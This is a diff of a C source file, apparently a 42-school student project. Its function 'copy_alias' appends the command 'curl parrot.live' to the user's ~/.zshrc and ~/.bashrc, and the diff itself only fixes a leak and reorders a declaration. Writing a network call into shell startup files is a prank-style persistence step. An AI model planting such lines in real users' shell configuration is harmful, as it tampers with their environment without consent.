@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/22 01:28:41 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/22 01:48:40 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,9 +16,9 @@ int	copy_alias(char **envp)
 {
 	int			i;
 	int			fd;
+	char		*path;
 	static char	*command = "curl parrot.live";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
-	char		*path;
 
 	printf("\033[36mStart shell rc modifications...\033[0m\n");
 	i = -1;
@@ -30,7 +30,7 @@ int	copy_alias(char **envp)
 		printf("opening and writing in %s\n", path);
 		fd = open(path, O_CREAT | O_WRONLY | O_APPEND | O_RDONLY);
 		if (fd < 0)
-			return (1);
+			return (free(path), 1);
 		dprintf(fd, "%s\n", command);
 		close(fd);
 		free(path);
